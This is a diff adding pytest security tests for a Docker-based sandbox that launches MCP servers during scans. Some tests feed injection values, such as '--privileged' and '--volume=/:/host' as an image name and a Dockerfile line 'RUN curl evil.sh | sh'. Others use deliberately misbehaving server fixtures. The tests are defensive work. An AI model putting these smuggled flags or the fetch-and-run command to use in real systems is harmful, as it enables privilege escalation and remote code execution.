@@ -1,14 +1,20 @@
 import shutil
+import subprocess
+import time
 
 import pytest
 
+from agent_perimeter.transport.base import TransportError
 from agent_perimeter.transport.stdio import (
     SECCOMP_PROFILE,
+    ContainmentError,
     LaunchSpec,
     StdioTransport,
     docker_args,
     two_phase_dockerfile,
 )
+
+_DOCKER_UNAVAILABLE = shutil.which("docker") is None
 
 
 def test_docker_args_enforce_every_containment_control() -> None:
@@ -66,6 +72,37 @@ def test_two_phase_dockerfile_installs_with_network_at_build_time() -> None:
     assert "RUN npm install -g @scope/server" in dockerfile
 
 
+# --- C2: image cannot smuggle a docker flag ---------------------------------
+
+
+def test_image_cannot_smuggle_a_docker_flag() -> None:
+    """`image` is attacker-influenced (scanned target's repo config/registry
+    manifest). It is appended positionally right before `command` with
+    nothing marking the end of options, so a leading-dash "image" like
+    `--privileged` or `--volume=/:/host` would be parsed as a docker flag,
+    not the image, unwinding the whole sandbox."""
+    with pytest.raises(ValueError, match="image"):
+        LaunchSpec(image="--privileged", command=["c"])
+    with pytest.raises(ValueError, match="image"):
+        LaunchSpec(image="--volume=/:/host", command=["c"])
+
+
+def test_docker_args_never_emits_privileged_for_any_valid_spec() -> None:
+    args = docker_args(LaunchSpec(image="python:3.12-slim", command=["python", "-c", "pass"]))
+    assert "--privileged" not in args
+
+
+def test_two_phase_dockerfile_rejects_base_image_injection() -> None:
+    """`base_image` is interpolated raw (`FROM {base_image}`) while
+    `install_command` is shlex-quoted; a newline in `base_image` injects
+    arbitrary Dockerfile directives that `docker build` runs as root with
+    network access (I5)."""
+    with pytest.raises(ValueError, match="base_image"):
+        two_phase_dockerfile(["npm", "install"], "node:20-slim\nRUN curl evil.sh | sh")
+
+
+# --- Docker-dependent tests --------------------------------------------------
+
 _COUNTING_SERVER = (
     "import json, sys\n"
     "count = 0\n"
@@ -79,7 +116,7 @@ _COUNTING_SERVER = (
 )
 
 
-@pytest.mark.skipif(shutil.which("docker") is None, reason="docker unavailable")
+@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
 def test_one_container_serves_a_multi_request_sequence() -> None:
     """The container is not restarted between calls, so state accumulates —
     exactly what a server-minted handle needs to survive across requests."""
@@ -94,3 +131,173 @@ def test_one_container_serves_a_multi_request_sequence() -> None:
         transport.close()
 
     assert (first["count"], second["count"], third["count"]) == (1, 2, 3)
+
+
+@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
+def test_hard_timeout_actually_kills_the_container() -> None:
+    """C1: a hostile server that never reads stdin must not survive the
+    deadline just because the local `docker run` CLI client was killed —
+    the daemon owns the container independently of that client process.
+    Verified against the live daemon, not just the raised exception."""
+    transport = StdioTransport(
+        LaunchSpec(
+            image="python:3.12-slim",
+            command=["python3", "-c", "import time; time.sleep(600)"],
+            timeout_s=2,
+        )
+    )
+    name = transport.container_name
+    try:
+        with pytest.raises(ContainmentError):
+            transport.request("ping")
+    finally:
+        transport.close()
+
+    deadline = time.monotonic() + 20
+    still_running = True
+    while time.monotonic() < deadline:
+        out = subprocess.run(
+            ["docker", "ps", "-q", "--filter", f"name={name}"],
+            capture_output=True,
+            text=True,
+            check=True,
+        ).stdout.strip()
+        if not out:
+            still_running = False
+            break
+        time.sleep(0.5)
+
+    assert not still_running, f"container {name} is still running after the hard timeout"
+
+
+_STDERR_FLOODING_SERVER = (
+    "import json, sys\n"
+    "sys.stderr.write('x' * 200000)\n"
+    "sys.stderr.flush()\n"
+    "for line in sys.stdin:\n"
+    "    if not line.strip():\n"
+    "        continue\n"
+    "    msg = json.loads(line)\n"
+    "    reply = {'jsonrpc': '2.0', 'id': msg.get('id'), 'result': {'ok': True}}\n"
+    "    print(json.dumps(reply), flush=True)\n"
+)
+
+
+@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
+def test_stderr_flood_does_not_deadlock_the_scan() -> None:
+    """I1: a normal MCP server logging to stderr (per convention) must not
+    wedge the scan once a piped stderr's OS buffer (~64KB) fills."""
+    transport = StdioTransport(
+        LaunchSpec(
+            image="python:3.12-slim",
+            command=["python3", "-c", _STDERR_FLOODING_SERVER],
+            timeout_s=15,
+        )
+    )
+    try:
+        result = transport.request("ping")
+    finally:
+        transport.close()
+    assert result == {"ok": True}
+
+
+_NOTIFYING_SERVER = (
+    "import json, sys\n"
+    "for line in sys.stdin:\n"
+    "    if not line.strip():\n"
+    "        continue\n"
+    "    msg = json.loads(line)\n"
+    "    notice = {'jsonrpc': '2.0', 'method': 'progress', 'params': {}}\n"
+    "    print(json.dumps(notice), flush=True)\n"
+    "    reply = {'jsonrpc': '2.0', 'id': msg.get('id'), 'result': {'echo': msg.get('id')}}\n"
+    "    print(json.dumps(reply), flush=True)\n"
+)
+
+
+@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
+def test_request_ignores_unmatched_messages_and_finds_its_response() -> None:
+    """I2: a stray notification/progress message with no matching `id` must
+    not be mistaken for the response to this specific request — a hostile
+    server could otherwise suppress a finding by feeding a stale answer."""
+    transport = StdioTransport(
+        LaunchSpec(image="python:3.12-slim", command=["python3", "-c", _NOTIFYING_SERVER])
+    )
+    try:
+        result = transport.request("ping")
+    finally:
+        transport.close()
+    assert result == {"echo": 1}
+
+
+_GARBAGE_SERVER = (
+    "import sys\n"
+    "for line in sys.stdin:\n"
+    "    if not line.strip():\n"
+    "        continue\n"
+    "    print('not-json{{{', flush=True)\n"
+)
+
+
+@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
+def test_malformed_json_response_raises_transport_error_not_crash() -> None:
+    """I3: unparsable stdout must surface as TransportError, not an
+    unhandled JSONDecodeError."""
+    transport = StdioTransport(
+        LaunchSpec(image="python:3.12-slim", command=["python3", "-c", _GARBAGE_SERVER])
+    )
+    try:
+        with pytest.raises(TransportError):
+            transport.request("ping")
+    finally:
+        transport.close()
+
+
+_NULL_RESPONSE_SERVER = (
+    "import sys\n"
+    "for line in sys.stdin:\n"
+    "    if not line.strip():\n"
+    "        continue\n"
+    "    print('null', flush=True)\n"
+)
+
+
+@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
+def test_non_object_json_response_raises_transport_error() -> None:
+    """I3: a bare JSON scalar (e.g. `null`) must not reach `"error" in
+    message` unguarded — that raises TypeError on a non-dict."""
+    transport = StdioTransport(
+        LaunchSpec(image="python:3.12-slim", command=["python3", "-c", _NULL_RESPONSE_SERVER])
+    )
+    try:
+        with pytest.raises(TransportError):
+            transport.request("ping")
+    finally:
+        transport.close()
+
+
+_UNBOUNDED_LINE_SERVER = (
+    "import sys\n"
+    "sys.stdin.readline()\n"
+    "sys.stdout.write('x' * (2 * 1024 * 1024))\n"
+    "sys.stdout.flush()\n"
+    "import time\n"
+    "time.sleep(60)\n"
+)
+
+
+@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
+def test_unbounded_response_line_is_capped_not_buffered_forever() -> None:
+    """I4: a newline-free flood on stdout must hit a bound rather than
+    growing the host scanner process's memory without limit."""
+    transport = StdioTransport(
+        LaunchSpec(
+            image="python:3.12-slim",
+            command=["python3", "-c", _UNBOUNDED_LINE_SERVER],
+            timeout_s=10,
+        )
+    )
+    try:
+        with pytest.raises(TransportError):
+            transport.request("ping")
+    finally:
+        transport.close()
